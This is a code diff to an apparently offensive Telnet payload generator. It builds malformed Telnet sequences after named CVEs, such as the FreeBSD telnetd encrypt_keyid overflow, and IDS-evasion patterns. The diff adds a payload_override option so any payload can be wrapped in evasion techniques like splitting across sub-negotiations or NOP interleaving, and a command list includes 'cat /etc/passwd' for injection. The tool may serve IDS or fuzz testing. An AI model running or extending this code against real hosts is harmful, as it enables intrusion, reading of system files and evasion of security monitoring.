@@ -168,7 +168,7 @@ def _clamp(data):
 
 # ── Strategy builders ────────────────────────────────────────────────────────
 
-def _build_iac_sequence_injection():
+def _build_iac_sequence_injection(payload_override=None):
     """Inject malformed / unexpected IAC sequences into the data stream.
 
     CVE-2001-0554 (AYT overflow) — flood of AYT commands caused heap corruption
@@ -177,6 +177,11 @@ def _build_iac_sequence_injection():
     many sequential IAC GA to confuse half-duplex parsers, IAC followed by data
     byte < 0xF0 (undefined range).
     """
+    if payload_override is not None:
+        payload = b""
+        for b in payload_override:
+            payload += bytes([b]) + _iac_cmd(_NOP)
+        return payload, _TELNET_PORT
     variant = random.randint(0, 7)
     if variant == 0:
         # CVE-2001-0554 pattern: AYT flood
@@ -507,7 +512,7 @@ def _build_authentication_option_abuse():
     return payload, _TELNET_PORT
 
 
-def _build_encrypt_option_exploit():
+def _build_encrypt_option_exploit(payload_override=None):
     """Telnet Encryption Option (RFC 2946) exploitation.
 
     CVE-2011-4862 (FreeBSD telnetd encrypt_keyid heap overflow) — oversized
@@ -517,6 +522,11 @@ def _build_encrypt_option_exploit():
     ENCRYPT_SUPPORT with all types, ENCRYPT_START without negotiation,
     ENCRYPT_IS/REPLY with format-string patterns.
     """
+    if payload_override is not None:
+        _ENC_KEYID = 0x07
+        data = bytes([_ENC_KEYID]) + payload_override
+        payload = _iac_cmd(_WILL, _OPT_ENCRYPT) + _iac_sb(_OPT_ENCRYPT, data)
+        return payload, _TELNET_PORT
     _ENC_IS        = 0x00
     _ENC_SUPPORT   = 0x01
     _ENC_REPLY     = 0x02
@@ -562,7 +572,7 @@ def _build_encrypt_option_exploit():
     return payload, _TELNET_PORT
 
 
-def _build_command_injection_evasion():
+def _build_command_injection_evasion(payload_override=None):
     """Telnet command injection and IDS content-match evasion.
 
     CVE-2022-29153 (Consul Telnet smuggling), CVE-2020-28017 (Exim BDAT special
@@ -572,6 +582,12 @@ def _build_command_injection_evasion():
     (type bad chars then erase them), Go Ahead insertion between command chars,
     null byte insertion, command split across Telnet sub-negotiations.
     """
+    if payload_override is not None:
+        mid = len(payload_override) // 2
+        payload = payload_override[:mid]
+        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + b"xterm")
+        payload += payload_override[mid:] + b"\r\n"
+        return payload, _TELNET_PORT
     variant = random.randint(0, 7)
     cmd = random.choice([
         b"cat /etc/passwd",
@@ -705,7 +721,7 @@ def _build_data_mark_urgent_abuse():
     return payload, _TELNET_PORT
 
 
-def _build_iac_escape_desync():
+def _build_iac_escape_desync(payload_override=None):
     """IAC escape sequence parser desynchronization.
 
     The IAC (0xFF) byte must be doubled (IAC IAC) in data to represent literal
@@ -714,6 +730,13 @@ def _build_iac_escape_desync():
     multi-byte option negotiation, rapid IAC toggling between command and data
     mode, IAC at exact buffer boundary sizes (256, 512, 1024, 4096).
     """
+    if payload_override is not None:
+        payload = b""
+        for b_val in payload_override:
+            payload += bytes([b_val])
+            if b_val == 0xFF:
+                payload += bytes([_IAC, _IAC])
+        return payload, _TELNET_PORT
     variant = random.randint(0, 7)
     if variant == 0:
         # Single IAC at various buffer boundaries
@@ -815,7 +838,7 @@ def _build_comport_option_overflow():
     return payload, _TELNET_PORT
 
 
-def _build_tcp_segmentation_evasion():
+def _build_tcp_segmentation_evasion(payload_override=None):
     """TCP segmentation for IDS evasion — Ptacek & Newsham pattern.
 
     Full Telnet message designed to be split at IAC boundaries, mid-option,
@@ -825,6 +848,11 @@ def _build_tcp_segmentation_evasion():
     NOTE: payload delivered as one block; actual TCP segmentation handled by
     the transport layer.
     """
+    if payload_override is not None:
+        payload = _iac_cmd(_WILL, _OPT_TERMTYPE)
+        payload += _iac_sb(_OPT_TERMTYPE, bytes([_TT_IS]) + b"xterm")
+        payload += payload_override + b"\r\n"
+        return payload, _TELNET_PORT
     variant = random.randint(0, 5)
     if variant == 0:
         # Login sequence with IAC options — designed for tiny segments
@@ -884,12 +912,21 @@ _BUILDERS = {
 }
 
 
-def build_telnet_payload(strategy: str):
+_TELNET_OVERRIDE_CAPABLE = frozenset([
+    "iac_sequence_injection", "encrypt_option_exploit",
+    "command_injection_evasion", "iac_escape_desync",
+    "tcp_segmentation_evasion",
+])
+
+def build_telnet_payload(strategy: str, payload_override=None):
     """Return (payload_bytes, dst_port) for the given strategy."""
     builder = _BUILDERS.get(strategy)
     if builder is None:
         builder = _build_iac_sequence_injection
-    payload, dst_port = builder()
+    if payload_override is not None and strategy in _TELNET_OVERRIDE_CAPABLE:
+        payload, dst_port = builder(payload_override=payload_override)
+    else:
+        payload, dst_port = builder()
     return _clamp(payload), dst_port
 
 
@@ -907,11 +944,11 @@ class TelnetMutator:
             return [self._external_weights.get(s, 5) for s in self.strategies]
         return TELNET_WEIGHTS
 
-    def mutate(self):
+    def mutate(self, payload_override=None):
         """Returns (payload_bytes, strategy_name, dst_port)."""
         if self._bandit:
             strategy = self._bandit.select_with_weights(self._external_weights or {})
         else:
             strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
-        payload, dst_port = build_telnet_payload(strategy)
+        payload, dst_port = build_telnet_payload(strategy, payload_override=payload_override)
         return payload, strategy, dst_port
